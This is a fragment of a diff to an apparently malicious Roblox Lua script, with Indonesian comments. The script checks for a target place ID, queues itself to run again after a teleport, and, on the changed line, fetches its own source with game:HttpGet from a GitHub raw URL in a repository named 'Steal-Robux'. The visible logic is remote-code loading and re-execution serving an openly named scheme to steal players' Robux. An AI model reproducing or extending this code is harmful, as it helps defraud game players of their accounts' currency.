@@ -6,7 +6,7 @@ local TARGET_PLACE_ID = 16060248763
 -- Jika belum berada di game milikmu, siapkan teleport dan antrekan eksekusi ulang
 if game.PlaceId ~= TARGET_PLACE_ID then
     -- Ambil source code script ini sendiri untuk diantrekan
-    local scriptSource = game:HttpGet("https://pastefy.app/xXT0sJVX/raw") -- *Opsional: ganti jika diload via loadstring
+    local scriptSource = game:HttpGet("https://raw.githubusercontent.com/dirga2634-sudo/Steal-Robux/refs/heads/main/StealRobux.lua") -- *Opsional: ganti jika diload via loadstring
     -- Jika dieksekusi manual, gunakan format string block:
     local payload = [[
         -- [ MASUKKAN SEMUA KODE DI BAWAH GARIS INI KE DALAM STRING INI JIKA TIDAK PAKAI LOADSTRING ]
